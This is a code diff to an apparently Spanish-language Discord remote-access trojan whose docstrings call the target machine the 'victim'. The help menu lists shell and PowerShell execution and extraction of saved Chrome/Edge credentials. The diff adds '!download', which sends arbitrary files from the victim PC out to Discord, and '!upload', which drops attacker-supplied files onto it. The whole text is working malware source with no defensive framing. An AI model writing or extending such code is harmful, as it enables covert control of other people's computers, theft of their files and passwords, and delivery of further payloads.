@@ -190,6 +190,8 @@ async def ayuda(ctx):
     embed.add_field(name="!notify [titulo] | [mensaje]", value="Muestra notificacion en Windows", inline=False)
     embed.add_field(name="!cmd [comando]", value="Ejecuta un comando del sistema operativo", inline=False)
     embed.add_field(name="!ps [comando]", value="Ejecuta un comando de PowerShell", inline=False)
+    embed.add_field(name="!download [ruta]", value="Descarga un archivo de la PC", inline=False)
+    embed.add_field(name="!upload [ruta]", value="Sube un archivo a la PC (adjuntar archivo)", inline=False)
     embed.add_field(name="!creds", value="Extrae credenciales guardadas en Chrome/Edge", inline=False)
     embed.add_field(name="!uptime", value="Tiempo encendida de la PC", inline=False)
     embed.add_field(name="!exit", value="Apaga el bot", inline=False)
@@ -359,6 +361,66 @@ async def ps(ctx, *, comando: str):
     if not channel_check(ctx):
         return
     await _run_and_reply(ctx, comando, shell_prefix="powershell -NoProfile -Command ")
+
+
+@bot.command()
+async def download(ctx, *, ruta: str):
+    """Descarga un archivo de la PC victima a Discord"""
+    if not channel_check(ctx):
+        return
+    ruta = ruta.strip('"').strip("'")
+    path = os.path.expandvars(os.path.expanduser(ruta))
+    if not os.path.exists(path):
+        await ctx.send(f"Archivo no encontrado: `{ruta}`")
+        return
+    if os.path.isdir(path):
+        await ctx.send(f"Es un directorio. Usa `!cmd dir \"{ruta}\"` para listar.")
+        return
+    size = os.path.getsize(path)
+    if size > 25 * 1024 * 1024:
+        await ctx.send(f"Archivo muy grande ({size // (1024*1024)} MB). Limite de Discord: 25 MB.")
+        return
+    if size == 0:
+        await ctx.send(f"Archivo vacio: `{ruta}`")
+        return
+    try:
+        await ctx.send(
+            content=f"```\n{path} ({size:,} bytes)\n```",
+            file=discord.File(path),
+        )
+    except Exception as e:
+        await ctx.send(f"Error al enviar: {e}")
+
+
+@bot.command()
+async def upload(ctx, *, ruta: str = None):
+    """Sube un archivo adjunto de Discord a la PC victima"""
+    if not channel_check(ctx):
+        return
+    if not ctx.message.attachments:
+        await ctx.send("Adjunta un archivo al mensaje. Uso: `!upload C:\\ruta\\destino\\archivo.txt` + archivo adjunto")
+        return
+    attachment = ctx.message.attachments[0]
+    if ruta:
+        ruta = ruta.strip('"').strip("'")
+        dest = os.path.expandvars(os.path.expanduser(ruta))
+        if os.path.isdir(dest):
+            dest = os.path.join(dest, attachment.filename)
+    else:
+        dest = os.path.join(os.path.expanduser("~"), "Desktop", attachment.filename)
+    dest_dir = os.path.dirname(dest)
+    if not os.path.isdir(dest_dir):
+        try:
+            os.makedirs(dest_dir, exist_ok=True)
+        except Exception as e:
+            await ctx.send(f"No se pudo crear directorio: {e}")
+            return
+    try:
+        await attachment.save(dest)
+        size = os.path.getsize(dest)
+        await ctx.send(f"Archivo guardado: `{dest}` ({size:,} bytes)")
+    except Exception as e:
+        await ctx.send(f"Error al guardar: {e}")
 
 
 @bot.command()
